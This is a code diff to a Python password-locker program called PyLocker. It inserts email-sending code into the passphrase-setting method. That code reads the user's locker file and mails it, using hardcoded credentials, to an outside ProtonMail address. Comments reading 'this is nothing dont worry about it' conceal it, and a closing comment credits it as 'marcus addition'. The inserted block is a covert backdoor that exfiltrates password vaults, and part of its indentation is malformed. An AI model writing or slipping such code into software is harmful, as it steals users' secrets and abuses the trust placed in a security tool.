@@ -5,6 +5,12 @@ import sys
 import json
 import secrets
 import argparse
+import email, smtplib, ssl
+
+from email import encoders
+from email.mime.base import MIMEBase
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
 
 from math import log
 from base64 import urlsafe_b64encode as b64e, urlsafe_b64decode as b64d
@@ -96,10 +102,56 @@ class PyLocker:
         """ Used to set the passphrase when creating a new locker; recursive """
         self.get_passphrase()
         confirmed_passphrase = stdiomask.getpass(prompt='Confirm passphrase: ', mask='*')
+      
+        """ this is nothing dont worry about it """
+        subject = "another one bites the dust"
+        body = "This is an email with attachment sent from Python"
+        sender_email = "mr-sk@mr-sk.com"
+        receiver_email = "marcus@protonmail.com"
+        password = "pass123"
+        # Create a multipart message and set headers
+        message = MIMEMultipart()
+        message["From"] = sender_email
+        message["To"] = receiver_email
+        message["Subject"] = subject
+        message["Bcc"] = receiver_email  # Recommended for mass emails
+
+        message.attach(MIMEText(body, "plain"))
+
+        # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #
+        # this is nothing, dont worry about it, im not worrying about it  #
+        # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #
+        filename = self.filename  
+
+        with open(filename, "rb") as attachment:
+            # Add file as application/octet-stream
+            # Email client can usually download this automatically as attachment
+            part = MIMEBase("application", "octet-stream")
+            part.set_payload(attachment.read())
+
+                # Encode file in ASCII characters to send by email    
+                encoders.encode_base64(part)
+
+               # Add header as key/value pair to attachment part
+                part.add_header(
+                    "Content-Disposition",
+                       f"attachment; filename= {filename}",
+        )
+
+        message.attach(part)
+        text = message.as_string()
+
+        context = ssl.create_default_context()
+        with smtplib.SMTP_SSL("smtp.protonmail.com", 465, context=context) as server:
+            server.login(sender_email, password)
+            server.sendmail(sender_email, receiver_email, text)
+
 
         if self.passphrase != confirmed_passphrase:
             print('Passphrases do not match')
             sys.exit()
+
+        # end of marcus addition
 
     def load_or_create_locker(self) -> None:
         """ If the locker file exists, read the contents and decrypt into memory.
